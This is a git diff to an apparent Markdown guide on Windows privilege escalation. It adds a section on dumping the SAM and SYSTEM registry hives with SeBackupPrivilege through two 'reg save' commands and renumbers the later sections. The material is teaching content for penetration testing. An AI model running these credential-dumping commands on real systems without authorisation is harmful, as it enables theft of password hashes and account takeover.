@@ -550,8 +550,18 @@ i686-w64-mingw32-gcc hello.c -static -o hello
 
 ---
 
+# 28. SAM Dump with SeBackupPrivilege
 
-# 28. Final Advice
+If a comprimised user has SeBackupPrivielege, the attacker can dump the SAM database used by the LSASS process.
+
+```
+reg save hklm\sam C:\Users\<username>\Desktop\SAM.hive
+reg save hklm\system C:\Users\<username>\Desktop\SYSTEM.hive
+```
+
+---
+
+# 29. Final Advice
 
 Privilege escalation on Windows is usually **misconfiguration**, not exploitation.
 
@@ -565,7 +575,7 @@ What executes automatically?
 
 The more thoroughly you enumerate, the faster you escalate privileges.
 
-# 29. Additional Resources
+# 30. Additional Resources
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
